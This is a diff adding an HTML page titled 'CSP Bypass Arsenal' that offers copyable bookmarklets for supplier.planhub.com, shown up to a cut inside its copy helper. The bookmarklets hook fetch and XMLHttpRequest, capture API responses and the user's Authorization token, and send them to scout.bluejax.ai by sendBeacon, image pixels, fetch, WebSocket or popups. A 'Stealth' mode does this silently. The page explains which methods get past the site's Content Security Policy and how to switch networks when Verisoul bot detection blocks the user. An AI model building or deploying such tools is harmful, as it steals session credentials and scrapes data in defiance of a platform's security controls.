@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Scout Sync Hub — CSP Bypass Arsenal</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro',system-ui,sans-serif;background:#08080f;color:#e0e0e0;min-height:100vh;padding:16px;-webkit-text-size-adjust:100%}
+.hdr{text-align:center;padding:28px 0 20px}
+.hdr h1{font-size:26px;background:linear-gradient(135deg,#00d4ff,#7c3aed,#f43f5e);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px;letter-spacing:-0.5px}
+.hdr p{color:#777;font-size:13px}
+.card{background:linear-gradient(145deg,#13132a,#0f0f22);border:1px solid #1f1f3a;border-radius:16px;padding:20px;margin-bottom:16px;box-shadow:0 4px 24px rgba(0,0,0,0.5)}
+.card h2{font-size:17px;color:#fff;margin-bottom:10px;display:flex;align-items:center;gap:8px}
+.card h3{font-size:15px;color:#ccc;margin-bottom:8px}
+.tag{display:inline-block;padding:3px 10px;border-radius:20px;font-size:11px;font-weight:700;margin:2px 4px 2px 0}
+.tag-green{background:rgba(34,197,94,0.15);color:#4ade80}
+.tag-blue{background:rgba(59,130,246,0.15);color:#60a5fa}
+.tag-orange{background:rgba(249,115,22,0.15);color:#fb923c}
+.tag-red{background:rgba(239,68,68,0.15);color:#f87171}
+.tag-purple{background:rgba(168,85,247,0.15);color:#c084fc}
+.tag-yellow{background:rgba(234,179,8,0.15);color:#fbbf24}
+.desc{font-size:13px;color:#999;line-height:1.6;margin:8px 0 12px}
+.code-box{background:#0a0a14;border:1px solid #252540;border-radius:10px;padding:12px;font-family:'SF Mono',Menlo,monospace;font-size:11px;color:#7dd3fc;word-break:break-all;line-height:1.5;max-height:100px;overflow:hidden;position:relative;-webkit-user-select:all;user-select:all}
+.code-box::after{content:'';position:absolute;bottom:0;left:0;right:0;height:40px;background:linear-gradient(transparent,#0a0a14);pointer-events:none}
+.btn{display:block;width:100%;padding:14px;border:none;border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;margin-top:10px;transition:transform 0.15s,box-shadow 0.15s;text-align:center;text-decoration:none}
+.btn:active{transform:scale(0.97)}
+.btn-purple{background:linear-gradient(135deg,#7c3aed,#5b21b6);color:white;box-shadow:0 4px 20px rgba(124,58,237,0.35)}
+.btn-green{background:linear-gradient(135deg,#22c55e,#16a34a);color:white;box-shadow:0 4px 20px rgba(34,197,94,0.25)}
+.btn-blue{background:linear-gradient(135deg,#3b82f6,#2563eb);color:white;box-shadow:0 4px 20px rgba(59,130,246,0.25)}
+.btn-orange{background:linear-gradient(135deg,#f97316,#ea580c);color:white;box-shadow:0 4px 20px rgba(249,115,22,0.25)}
+.divider{height:1px;background:linear-gradient(90deg,transparent,#333,transparent);margin:24px 0}
+.table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:12px 0}
+table{width:100%;border-collapse:collapse;font-size:12px;min-width:500px}
+th{background:#1a1a32;color:#aaa;padding:8px 6px;text-align:left;font-weight:600;white-space:nowrap}
+td{padding:7px 6px;border-bottom:1px solid #1a1a2e;color:#ccc;white-space:nowrap}
+tr:hover td{background:rgba(124,58,237,0.05)}
+.badge{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:4px}
+.badge-g{background:#22c55e}
+.badge-y{background:#eab308}
+.badge-r{background:#ef4444}
+.note{background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.2);border-radius:10px;padding:12px;font-size:13px;color:#93c5fd;margin:12px 0}
+.warn{background:rgba(234,179,8,0.08);border:1px solid rgba(234,179,8,0.2);border-radius:10px;padding:12px;font-size:13px;color:#fbbf24;margin:12px 0}
+.step{display:flex;gap:10px;margin-bottom:12px;align-items:flex-start}
+.step-n{background:linear-gradient(135deg,#7c3aed,#3b82f6);color:white;width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:12px;flex-shrink:0;margin-top:1px}
+.step-t{font-size:14px;line-height:1.5}
+.step-t strong{color:#00d4ff}
+.toast{position:fixed;bottom:40px;left:50%;transform:translateX(-50%) translateY(100px);background:#22c55e;color:white;padding:12px 24px;border-radius:30px;font-weight:700;font-size:15px;box-shadow:0 8px 30px rgba(34,197,94,0.5);transition:transform 0.3s ease;z-index:999}
+.toast.show{transform:translateX(-50%) translateY(0)}
+.collapsed .code-box{display:none}
+.collapsed .btn{display:none}
+.toggle{color:#7c3aed;font-size:13px;cursor:pointer;text-decoration:underline;display:inline-block;margin-top:6px}
+</style>
+</head>
+<body>
+
+<div class="hdr">
+  <h1>📡 Scout Sync Hub</h1>
+  <p>PlanHub CSP Bypass Arsenal — v11</p>
+  <p style="color:#555;font-size:11px;margin-top:4px">sendBeacon ✅ confirmed working. Stealth mode now available.</p>
+</div>
+
+<!-- === OVERVIEW TABLE === -->
+<div class="card">
+  <h2>🗺️ Method Comparison</h2>
+  <div class="table-wrap">
+  <table>
+    <tr><th>#</th><th>Method</th><th>Silent?</th><th>Manual?</th><th>CSP Risk</th><th>Status</th></tr>
+    <tr style="background:rgba(34,197,94,0.08)"><td>⭐</td><td>🔥 <strong>Stealth v11</strong></td><td>✅ Yes</td><td>1 tap dump</td><td><span class="badge badge-g"></span>None</td><td>✅ CONFIRMED</td></tr>
+    <tr><td>A</td><td>🚀 Popup Sync</td><td>No</td><td>1 tap</td><td><span class="badge badge-g"></span>None</td><td>✅ CONFIRMED</td></tr>
+    <tr><td>B</td><td>📋 Clipboard Bridge</td><td>No</td><td>Copy+Paste</td><td><span class="badge badge-g"></span>None</td><td>untested</td></tr>
+    <tr><td>C</td><td>📁 Download JSON</td><td>No</td><td>Download+Upload</td><td><span class="badge badge-g"></span>None</td><td>untested</td></tr>
+    <tr><td>D</td><td>🖼️ Image Pixel</td><td>✅ Yes</td><td>None</td><td><span class="badge badge-y"></span>img-src</td><td>⚠️ fired</td></tr>
+    <tr><td>E</td><td>📡 Direct Fetch</td><td>✅ Yes</td><td>None</td><td><span class="badge badge-r"></span>connect-src</td><td>❌ BLOCKED</td></tr>
+    <tr><td>F</td><td>🔔 sendBeacon</td><td>✅ Yes</td><td>None</td><td><span class="badge badge-g"></span>Bypasses!</td><td>✅ CONFIRMED</td></tr>
+    <tr><td>G</td><td>🔌 WebSocket</td><td>✅ Yes</td><td>None</td><td><span class="badge badge-r"></span>connect-src</td><td>❌ BLOCKED</td></tr>
+    <tr><td>H</td><td>💣 MEGA (All-in-One)</td><td>Mixed</td><td>1 tap</td><td><span class="badge badge-g"></span>Tries all</td><td>✅ Diagnostic</td></tr>
+  </table>
+  </div>
+  <div class="note">🔥 <strong>sendBeacon CONFIRMED WORKING</strong> — bypasses PlanHub's CSP! Use <strong>Stealth v11</strong> for silent auto-capture. Popup Sync also confirmed ✅. Fetch/WebSocket are blocked ❌.</div>
+</div>
+
+<!-- === STEALTH v11 (NEW — PRODUCTION READY) === -->
+<div class="card" style="border-color:#22c55e;border-width:2px" id="card-S">
+  <h2>🔥 Stealth v11 — PRODUCTION</h2>
+  <div>
+    <span class="tag tag-green">✅ CSP Confirmed</span>
+    <span class="tag tag-green">Silent Auto-Exfil</span>
+    <span class="tag tag-purple">sendBeacon</span>
+    <span class="tag tag-blue">Popup Fallback</span>
+  </div>
+  <p class="desc">The production bookmarklet based on confirmed test results. Uses <strong>sendBeacon</strong> (confirmed to bypass PlanHub's CSP) to silently fire data on every API capture. Also includes a <strong>DUMP button</strong> that opens the Sync Page as backup. Just browse PlanHub — data gets exfiltrated automatically.</p>
+  <div class="note">🎯 <strong>How it works:</strong> Hook → Intercept every API response → Auto-fire sendBeacon to Supabase + scout.bluejax.ai → Show floating counter. When done browsing, tap DUMP to send everything via popup sync as backup.</div>
+  <div class="code-box" id="code-S"></div>
+  <button class="btn btn-green" onclick="copy('S')" style="font-size:17px;padding:16px">🔥 Copy Stealth v11 Bookmarklet</button>
+</div>
+
+<!-- === MEGA BOOKMARKLET === -->
+<div class="card" id="card-H">
+  <h2>💣 H — MEGA (Recommended)</h2>
+  <div>
+    <span class="tag tag-purple">Tries All Methods</span>
+    <span class="tag tag-green">Auto-Detect</span>
+    <span class="tag tag-blue">Zero Config</span>
+  </div>
+  <p class="desc">The nuclear option. Intercepts PlanHub API traffic, then fires <strong>every exfiltration method simultaneously</strong>. Shows a live report of which methods succeeded and which CSP blocked. Run this first to find out what works.</p>
+  <div class="code-box" id="code-H"></div>
+  <button class="btn btn-purple" onclick="copy('H')">📋 Copy MEGA Bookmarklet</button>
+</div>
+
+<!-- === METHOD A: POPUP === -->
+<div class="card" id="card-A">
+  <h2>🚀 A — Popup Sync</h2>
+  <div>
+    <span class="tag tag-green">CSP-Proof</span>
+    <span class="tag tag-blue">Navigation Bypass</span>
+  </div>
+  <p class="desc">Intercepts data, then opens <strong>our sync page in a new window</strong> with data in the URL hash. The sync page has no CSP — it freely pushes to Supabase. Uses page navigation (not fetch), so CSP connect-src is irrelevant.</p>
+  <div class="code-box" id="code-A"></div>
+  <button class="btn btn-purple" onclick="copy('A')">📋 Copy Popup Bookmarklet</button>
+</div>
+
+<!-- === METHOD B: CLIPBOARD === -->
+<div class="card" id="card-B">
+  <h2>📋 B — Clipboard Bridge</h2>
+  <div>
+    <span class="tag tag-green">CSP-Proof</span>
+    <span class="tag tag-yellow">Manual Step</span>
+  </div>
+  <p class="desc">Intercepts data and stores it locally. Shows a floating "COPY" button. Tap to copy the JSON, then open the <a href="sync.html" style="color:#60a5fa">Sync Page</a> and paste. <strong>Zero network from PlanHub</strong>.</p>
+  <div class="code-box" id="code-B"></div>
+  <button class="btn btn-purple" onclick="copy('B')">📋 Copy Clipboard Bookmarklet</button>
+</div>
+
+<!-- === METHOD C: DOWNLOAD === -->
+<div class="card" id="card-C">
+  <h2>📁 C — Download JSON</h2>
+  <div>
+    <span class="tag tag-green">CSP-Proof</span>
+    <span class="tag tag-yellow">Manual Step</span>
+  </div>
+  <p class="desc">Intercepts data and generates a downloadable <code>.json</code> file via Blob URL. User downloads the file, then uploads it on the <a href="sync.html" style="color:#60a5fa">Sync Page</a>.</p>
+  <div class="code-box" id="code-C"></div>
+  <button class="btn btn-purple" onclick="copy('C')">📋 Copy Download Bookmarklet</button>
+</div>
+
+<!-- === METHOD D: IMAGE PIXEL === -->
+<div class="card" id="card-D">
+  <h2>🖼️ D — Image Pixel Exfil</h2>
+  <div>
+    <span class="tag tag-blue">Silent</span>
+    <span class="tag tag-orange">img-src Dependent</span>
+  </div>
+  <p class="desc">Silently exfiltrates data by encoding it as query params on <code>&lt;img&gt;</code> tag src URLs. If PlanHub's CSP allows loading images from external domains (common), this works <strong>100% silently</strong> with no user interaction.</p>
+  <div class="code-box" id="code-D"></div>
+  <button class="btn btn-purple" onclick="copy('D')">📋 Copy Pixel Bookmarklet</button>
+</div>
+
+<!-- === METHOD E: DIRECT FETCH === -->
+<div class="card" id="card-E">
+  <h2>📡 E — Direct Fetch</h2>
+  <div>
+    <span class="tag tag-blue">Silent</span>
+    <span class="tag tag-red">Likely Blocked</span>
+  </div>
+  <p class="desc">Straightforward attempt to POST data via <code>fetch()</code>. This was blocked before by connect-src CSP, but included as a baseline test. Also tries <code>no-cors</code> mode as fallback.</p>
+  <div class="code-box" id="code-E"></div>
+  <button class="btn btn-purple" onclick="copy('E')">📋 Copy Fetch Bookmarklet</button>
+</div>
+
+<!-- === METHOD F: SENDBEACON === -->
+<div class="card" id="card-F">
+  <h2>🔔 F — sendBeacon</h2>
+  <div>
+    <span class="tag tag-blue">Silent</span>
+    <span class="tag tag-red">Likely Blocked</span>
+  </div>
+  <p class="desc">Uses <code>navigator.sendBeacon()</code> which is designed for "fire and forget" data. Some browsers treat it differently from fetch for CSP. Worth testing.</p>
+  <div class="code-box" id="code-F"></div>
+  <button class="btn btn-purple" onclick="copy('F')">📋 Copy Beacon Bookmarklet</button>
+</div>
+
+<!-- === METHOD G: WEBSOCKET === -->
+<div class="card" id="card-G">
+  <h2>🔌 G — WebSocket Tunnel</h2>
+  <div>
+    <span class="tag tag-blue">Silent</span>
+    <span class="tag tag-orange">connect-src</span>
+  </div>
+  <p class="desc">Attempts a WebSocket connection. Some CSP implementations treat WS differently from HTTP. If PlanHub's <code>connect-src</code> doesn't explicitly block <code>wss://</code>, this tunnels through.</p>
+  <div class="code-box" id="code-G"></div>
+  <button class="btn btn-purple" onclick="copy('G')">📋 Copy WebSocket Bookmarklet</button>
+</div>
+
+<div class="divider"></div>
+
+<!-- === SYNC PAGE LINK === -->
+<div class="card">
+  <h2>🔗 Sync Page</h2>
+  <p class="desc">For methods B (Clipboard) and C (Download), open the sync page to receive and push the data to Supabase.</p>
+  <a href="sync.html" class="btn btn-green">Open Sync Page →</a>
+</div>
+
+<!-- === SETUP INSTRUCTIONS === -->
+<div class="card">
+  <h2>📖 iPhone Setup</h2>
+  <div class="step"><div class="step-n">1</div><div class="step-t">Pick a method above (start with <strong>H — MEGA</strong>) and tap <strong>Copy</strong></div></div>
+  <div class="step"><div class="step-n">2</div><div class="step-t">Open <strong>supplier.planhub.com</strong> in Safari</div></div>
+  <div class="step"><div class="step-n">3</div><div class="step-t">Tap <strong>Share</strong> → <strong>Add Bookmark</strong> → name it <strong>"Scout"</strong> → Save</div></div>
+  <div class="step"><div class="step-n">4</div><div class="step-t">Open <strong>Bookmarks</strong> → find <strong>"Scout"</strong> → <strong>Edit</strong></div></div>
+  <div class="step"><div class="step-n">5</div><div class="step-t">Tap the <strong>URL field</strong> → <strong>Select All</strong> → <strong>Delete</strong> → <strong>Paste</strong> → <strong>Done</strong></div></div>
+  <div class="divider"></div>
+  <h2>▶️ How to Run</h2>
+  <div class="step"><div class="step-n">1</div><div class="step-t">Go to <strong>supplier.planhub.com</strong>, log in</div></div>
+  <div class="step"><div class="step-n">2</div><div class="step-t">Tap the <strong>address bar</strong> → type <strong>"Scout"</strong> → tap your bookmark</div></div>
+  <div class="step"><div class="step-n">3</div><div class="step-t">Browse around PlanHub. <strong>Click on projects, open details</strong> — the interceptor silently captures all API responses</div></div>
+  <div class="step"><div class="step-n">4</div><div class="step-t">When the floating badge shows captured data, tap <strong>SYNC</strong> to exfiltrate</div></div>
+  <div class="warn">⚠️ You must be <strong>logged in</strong> on PlanHub. The interceptor captures native API traffic from your authenticated session. Use <strong>LTE network</strong> (not home WiFi) if Verisoul blocks you.</div>
+</div>
+
+<div id="toast" class="toast">✅ Copied!</div>
+
+<script>
+// ============================================================
+// SYNC PAGE URL — Update this if deploying to a different URL
+// ============================================================
+var SYNC_PAGE = (location.origin + location.pathname).replace('index.html','') + 'sync.html';
+var API_URL = 'https://scout.bluejax.ai/api/enrich/push';
+var SUPABASE_URL = 'https://scout.bluejax.ai';  // Redirected from paused Supabase to our own API
+var SUPABASE_KEY = 'not-needed';  // Key not needed for our own API
+
+// ============================================================
+// SHARED INTERCEPTOR CORE (minified — used by all bookmarklets)
+// This hooks fetch() and XMLHttpRequest to capture PlanHub API
+// responses as the user browses naturally.
+// ============================================================
+var CORE = [
+  "if(window._S){document.getElementById('_sc')&&(document.getElementById('_sc').textContent=window._S.n);return}",
+  "window._S={d:[],n:0,tok:''};",
+  "var _oF=window.fetch;",
+  "window.fetch=function(){var a=arguments,u=typeof a[0]==='string'?a[0]:(a[0]&&a[0].url||''),o=a[1]||{};",
+  "if(o.headers){var h=o.headers;if(h.authorization||h.Authorization)window._S.tok=h.authorization||h.Authorization}",
+  "return _oF.apply(this,a).then(function(r){",
+  "if(u&&(u.indexOf('ActivityTracker')>-1||u.indexOf('get-filtered')>-1||u.indexOf('get-details')>-1||u.indexOf('/company/')>-1||u.indexOf('projects/search')>-1||u.indexOf('planhub.com/api')>-1)){",
+  "try{var c=r.clone();c.json().then(function(j){window._S.d.push({t:Date.now(),u:u,p:location.href,j:j});window._S.n++;var el=document.getElementById('_sc');if(el)el.textContent=window._S.n}).catch(function(){})}catch(e){}}",
+  "return r})};",
+  "var _oX=XMLHttpRequest.prototype.open,_oS=XMLHttpRequest.prototype.send;",
+  "XMLHttpRequest.prototype.open=function(m,u){this._su=u;return _oX.apply(this,arguments)};",
+  "XMLHttpRequest.prototype.send=function(){var x=this;x.addEventListener('load',function(){var u=x._su||'';",
+  "if(u&&(u.indexOf('ActivityTracker')>-1||u.indexOf('get-filtered')>-1||u.indexOf('get-details')>-1||u.indexOf('/company/')>-1||u.indexOf('projects/search')>-1||u.indexOf('planhub.com/api')>-1)){",
+  "try{var j=JSON.parse(x.responseText);window._S.d.push({t:Date.now(),u:u,p:location.href,j:j});window._S.n++;var el=document.getElementById('_sc');if(el)el.textContent=window._S.n}catch(e){}}});",
+  "return _oS.apply(this,arguments)};"
+].join('');
+
+// ============================================================
+// FLOATING UI (minified — shows capture count + sync button)
+// ============================================================
+function UI(btnLabel, onClickCode) {
+  return "var _ui=document.createElement('div');_ui.id='_scout_panel';_ui.innerHTML='<div style=\"position:fixed;bottom:20px;right:16px;z-index:99999;background:linear-gradient(135deg,rgba(124,58,237,0.95),rgba(91,33,182,0.95));color:white;padding:10px 14px;border-radius:14px;font-family:-apple-system,system-ui;font-size:13px;box-shadow:0 6px 28px rgba(0,0,0,0.5);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);display:flex;gap:8px;align-items:center\"><span style=\\\"font-size:18px\\\">📡</span><span id=\\\"_sc\\\">0</span> caught<button id=\\\"_syncbtn\\\" onclick=\\\""+onClickCode+"\\\" style=\\\"background:linear-gradient(135deg,#22c55e,#16a34a);color:white;border:none;padding:8px 14px;border-radius:10px;font-weight:700;font-size:13px;cursor:pointer;margin-left:4px\\\">"+btnLabel+"</button></div>';document.body.appendChild(_ui);";
+}
+
+// ============================================================
+// BOOKMARKLET DEFINITIONS
+// ============================================================
+var BOOKMARKLETS = {};
+
+// --- A: POPUP SYNC ---
+BOOKMARKLETS.A = "javascript:void(function(){" + CORE +
+  UI("🚀 SYNC", "_scoutPopup()") +
+  "window._scoutPopup=function(){if(!window._S.d.length){alert('No data captured yet. Browse PlanHub first!');return}" +
+  "try{var json=JSON.stringify({token:window._S.tok,url:location.href,captured:window._S.d});" +
+  "var b64=btoa(unescape(encodeURIComponent(json)));" +
+  "if(b64.length>50000){var chunks=[];for(var i=0;i<b64.length;i+=45000)chunks.push(b64.slice(i,i+45000));" +
+  "for(var c=0;c<chunks.length;c++){window.open('SYNC_PAGE#chunk='+c+'&total='+chunks.length+'&d='+chunks[c])}}" +
+  "else{window.open('SYNC_PAGE#d='+b64)}" +
+  "document.getElementById('_syncbtn').textContent='✅ SENT'}catch(e){alert('Popup err: '+e.message)}};" +
+  "}())".replace(/SYNC_PAGE/g, SYNC_PAGE);
+
+// --- B: CLIPBOARD BRIDGE ---
+BOOKMARKLETS.B = "javascript:void(function(){" + CORE +
+  UI("📋 COPY", "_scoutCopy()") +
+  "window._scoutCopy=function(){if(!window._S.d.length){alert('No data captured yet. Browse PlanHub first!');return}" +
+  "var json=JSON.stringify({token:window._S.tok,url:location.href,captured:window._S.d});" +
+  "if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(json).then(function(){" +
+  "document.getElementById('_syncbtn').textContent='✅ COPIED';alert('Copied '+window._S.d.length+' records!\\n\\nNow open the Sync Page and paste.')}).catch(function(){_fallbackCopy(json)})}" +
+  "else{_fallbackCopy(json)}};" +
+  "window._fallbackCopy=function(t){var ta=document.createElement('textarea');ta.value=t;" +
+  "ta.style.cssText='position:fixed;left:0;top:0;width:100%;height:200px;font-size:12px;z-index:999999;background:#111;color:#0f0;padding:12px;border:2px solid #7c3aed';" +
+  "document.body.appendChild(ta);ta.focus();ta.select();ta.setSelectionRange(0,t.length);" +
+  "try{document.execCommand('copy');ta.remove();document.getElementById('_syncbtn').textContent='✅ COPIED';alert('Copied! Open Sync Page and paste.')}catch(e){alert('Select all text above and copy manually.')}};" +
+  "}())";
+
+// --- C: DOWNLOAD JSON ---
+BOOKMARKLETS.C = "javascript:void(function(){" + CORE +
+  UI("📁 SAVE", "_scoutDownload()") +
+  "window._scoutDownload=function(){if(!window._S.d.length){alert('No data captured yet. Browse PlanHub first!');return}" +
+  "var json=JSON.stringify({token:window._S.tok,url:location.href,captured:window._S.d},null,2);" +
+  "var blob=new Blob([json],{type:'application/json'});" +
+  "var url=URL.createObjectURL(blob);" +
+  "var a=document.createElement('a');a.href=url;a.download='scout_'+Date.now()+'.json';" +
+  "document.body.appendChild(a);a.click();a.remove();URL.revokeObjectURL(url);" +
+  "document.getElementById('_syncbtn').textContent='✅ SAVED';alert('File downloaded! Open the Sync Page and upload it.')};" +
+  "}())";
+
+// --- D: IMAGE PIXEL ---
+BOOKMARKLETS.D = "javascript:void(function(){" + CORE +
+  // Pixel variant auto-sends on each capture, no button needed
+  "var _origPush=window._S.d.push.bind(window._S.d);" +
+  "window._S.d.push=function(item){_origPush(item);" +
+  "try{var json=JSON.stringify(item);var b64=btoa(unescape(encodeURIComponent(json)));" +
+  "var chunks=[];for(var i=0;i<b64.length;i+=1400)chunks.push(b64.slice(i,i+1400));" +
+  "var sid='px'+Date.now();for(var c=0;c<chunks.length;c++){" +
+  "new Image().src='API_URL_PIXEL?sid='+sid+'&i='+c+'&n='+chunks.length+'&d='+encodeURIComponent(chunks[c])}" +
+  "}catch(e){}};" +
+  UI("🖼️ PIXEL", "alert('Pixel mode is automatic!\\n'+window._S.n+' items auto-exfiled via img tags.')") +
+  "}())".replace('API_URL_PIXEL', API_URL.replace('/enrich/push','/pixel'));
+
+// --- E: DIRECT FETCH ---
+BOOKMARKLETS.E = "javascript:void(function(){" + CORE +
+  UI("📡 PUSH", "_scoutFetch()") +
+  "window._scoutFetch=function(){if(!window._S.d.length){alert('No data captured yet.');return}" +
+  "var json=JSON.stringify({token:window._S.tok,url:location.href,captured:window._S.d});" +
+  "var btn=document.getElementById('_syncbtn');btn.textContent='⏳...';" +
+  // Try normal fetch first
+  "fetch('"+API_URL+"',{method:'POST',headers:{'content-type':'application/json'},body:json})" +
+  ".then(function(r){btn.textContent=r.ok?'✅ '+r.status:'❌ '+r.status;alert('Fetch result: '+r.status)})" +
+  ".catch(function(e){" +
+  // Fallback: try no-cors mode
+  "fetch('"+API_URL+"',{method:'POST',mode:'no-cors',headers:{'content-type':'text/plain'},body:json})" +
+  ".then(function(){btn.textContent='⚠️ no-cors';alert('Sent in no-cors mode. Check server.')})" +
+  ".catch(function(e2){btn.textContent='❌ BLOCKED';alert('Both fetch modes blocked by CSP.\\n'+e.message)})" +
+  "})};" +
+  "}())";
+
+// --- F: SENDBEACON ---
+BOOKMARKLETS.F = "javascript:void(function(){" + CORE +
+  UI("🔔 BEACON", "_scoutBeacon()") +
+  "window._scoutBeacon=function(){if(!window._S.d.length){alert('No data captured yet.');return}" +
+  "var json=JSON.stringify({token:window._S.tok,url:location.href,captured:window._S.d});" +
+  "var blob=new Blob([json],{type:'application/json'});" +
+  "try{var ok=navigator.sendBeacon('"+API_URL+"',blob);" +
+  "document.getElementById('_syncbtn').textContent=ok?'✅ SENT':'❌ FAIL';" +
+  "alert('sendBeacon returned: '+(ok?'SUCCESS — data queued for delivery':'FAILED — CSP blocked'))}catch(e){" +
+  "document.getElementById('_syncbtn').textContent='❌ ERR';alert('sendBeacon error: '+e.message)}};" +
+  "}())";
+
+// --- G: WEBSOCKET ---
+BOOKMARKLETS.G = "javascript:void(function(){" + CORE +
+  UI("\ud83d\udd0c WS", "_scoutWS()") +
+  "window._scoutWS=function(){if(!window._S.d.length){alert('No data captured yet.');return}" +
+  "var json=JSON.stringify({token:window._S.tok,url:location.href,captured:window._S.d});" +
+  "var btn=document.getElementById('_syncbtn');btn.textContent='\u23f3...';" +
+  "try{var ws=new WebSocket('wss://scout.bluejax.ai/ws');" +
+  "ws.onopen=function(){ws.send(json);btn.textContent='\u2705 SENT';alert('WebSocket: Data sent!');ws.close()};" +
+  "ws.onerror=function(){btn.textContent='\u274c FAIL';alert('WebSocket blocked.')};" +
+  "ws.onclose=function(){}}catch(e){btn.textContent='\u274c ERR';alert('WS error: '+e.message)}};" +
+  "}())";
+
+// --- S: STEALTH BEACON v11 (PRODUCTION) ---
+BOOKMARKLETS.S = "javascript:void(function(){" + CORE +
+  "var _origPush=window._S.d.push.bind(window._S.d);" +
+  "window._S.d.push=function(item){_origPush(item);" +
+  "try{var p=JSON.stringify({source:'stealth_v11',ts:Date.now(),page:location.href,data:item});" +
+  "var b=new Blob([p],{type:'application/json'});" +
+  "navigator.sendBeacon('" + API_URL + "',b);" +
+  "var sp=JSON.stringify({payload:p,source:'stealth_v11_auto',created_at:new Date().toISOString()});" +
+  "navigator.sendBeacon('" + SUPABASE_URL + "/api/scout/inbox?_legacy=" + SUPABASE_KEY + "',new Blob([sp],{type:'application/json'}));" +
+  "}catch(e){};return window._S.d.length};" +
+  UI("\ud83d\udce4 DUMP", "_scoutDump()") +
+  "window._scoutDump=function(){if(!window._S.d.length){alert('No data yet. Browse PlanHub first!');return}" +
+  "try{var json=JSON.stringify({token:window._S.tok,url:location.href,captured:window._S.d,source:'stealth_v11_dump'});" +
+  "var b64=btoa(unescape(encodeURIComponent(json)));" +
+  "navigator.sendBeacon('" + API_URL + "',new Blob([json],{type:'application/json'}));" +
+  "if(b64.length>50000){var ch=[];for(var i=0;i<b64.length;i+=45000)ch.push(b64.slice(i,i+45000));" +
+  "for(var c=0;c<ch.length;c++){window.open('SYNC_PAGE#chunk='+c+'&total='+ch.length+'&d='+ch[c])}}" +
+  "else{window.open('SYNC_PAGE#d='+b64)}" +
+  "document.getElementById('_syncbtn').textContent='\u2705 SENT '+window._S.d.length;" +
+  "alert('Sent '+window._S.d.length+' captures!')}catch(e){alert('Err: '+e.message)}};" +
+  "}())".replace(/SYNC_PAGE/g, SYNC_PAGE);
+
+// --- H: MEGA (ALL METHODS) ---
+BOOKMARKLETS.H = "javascript:void(function(){" + CORE +
+  UI("\ud83d\udca3 MEGA", "_scoutMega()") +
+  "window._scoutMega=function(){if(!window._S.d.length){alert('No data yet. Browse first!');return}" +
+  "var json=JSON.stringify({token:window._S.tok,url:location.href,captured:window._S.d});" +
+  "var b64=btoa(unescape(encodeURIComponent(json)));" +
+  "var R=[];var btn=document.getElementById('_syncbtn');btn.textContent='\u23f3...';" +
+  "fetch('"+API_URL+"',{method:'POST',headers:{'content-type':'application/json'},body:json})" +
+  ".then(function(r){R.push('A.Fetch: \u2705 '+r.status)}).catch(function(e){R.push('A.Fetch: \u274c '+e.message)});" +
+  "fetch('"+API_URL+"',{method:'POST',mode:'no-cors',headers:{'content-type':'text/plain'},body:json})" +
+  ".then(function(){R.push('B.NoCors: \u26a0\ufe0f sent')}).catch(function(e){R.push('B.NoCors: \u274c '+e.message)});" +
+  "try{var bk=navigator.sendBeacon('"+API_URL+"',new Blob([json],{type:'application/json'}));" +
+  "R.push('C.Beacon: '+(bk?'\u2705 queued':'\u274c rejected'))}catch(e){R.push('C.Beacon: \u274c '+e.message)}" +
+  "try{var sb=new Blob([JSON.stringify({payload:json,source:'mega_beacon',created_at:new Date().toISOString()})],{type:'application/json'});" +
+  "var sbOk=navigator.sendBeacon('"+SUPABASE_URL+"/api/scout/inbox',sb);" +
+  "R.push('D.Beacon>SB: '+(sbOk?'\u2705 queued':'\u274c rejected'))}catch(e){R.push('D.Beacon>SB: \u274c '+e.message)}" +
+  "try{new Image().src='"+API_URL.replace('/enrich/push','/pixel')+"?sid=mega'+Date.now()+'&d=test';" +
+  "R.push('E.Pixel: \u26a0\ufe0f fired')}catch(e){R.push('E.Pixel: \u274c '+e.message)}" +
+  "fetch('"+SUPABASE_URL+"/rest/v1/scout_inbox',{method:'POST',headers:{'apikey':'"+SUPABASE_KEY+"','Authorization':'Bearer "+SUPABASE_KEY+"','Content-Type':'application/json','Prefer':'return=minimal'},body:JSON.stringify({payload:json,source:'mega_fetch',created_at:new Date().toISOString()})})" +
+  ".then(function(r){R.push('F.Fetch>SB: '+(r.ok?'\u2705 '+r.status:'\u274c '+r.status))}).catch(function(e){R.push('F.Fetch>SB: \u274c '+e.message)});" +
+  "try{window.open('SYNC_PAGE#d='+b64);R.push('G.Popup: \u2705 opened')}catch(e){R.push('G.Popup: \u274c '+e.message)}" +
+  "setTimeout(function(){btn.textContent='\ud83d\udcca DONE';alert('=== MEGA RESULTS ===\\n\\n'+R.join('\\n')+'\\n\\n\u2705=worked \u274c=blocked \u26a0\ufe0f=maybe')},5000)};" +
+  "}())".replace(/SYNC_PAGE/g, SYNC_PAGE);
+// ============================================================
+// RENDER BOOKMARKLETS INTO PAGE
+// ============================================================
+['S','H','A','B','C','D','E','F','G'].forEach(function(id) {
+  var el = document.getElementById('code-' + id);
+  if (el) el.textContent = BOOKMARKLETS[id];
+});
+
+// ============================================================
+// COPY FUNCTION
+// ============================================================
+function copy(id) {
+  var text = BOOKMARKLETS[id];
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(text).then(function() {
+      showToast('✅ Method ' + id + ' copied!');
+    }).catch(function() {
+      fallbackCopy(text, id);
+    });
+  } else {
+    fallbackCopy(text, id);
+  }
+}
+
+function fallbackCopy(text, id) {
+  var ta = document.createElement('textarea');
+  ta.value = text;
+  ta.style.cssText = 'position:fixed;left:0;top:0;width:100%;height:120px;font-size:12px;z-index:99999;background:#0a0a14;color:#7dd3fc;padding:12px;border:2px solid #7c3aed;border-radius:10px';
+  document.body.appendChild(ta);
+  ta.focus();
+  ta.select();
+  ta.setSelectionRange(0, text.length);
+  try {
+    document.execCommand('copy');
+    ta.remove();
+    showToast('✅ Method ' + id + ' copied!');
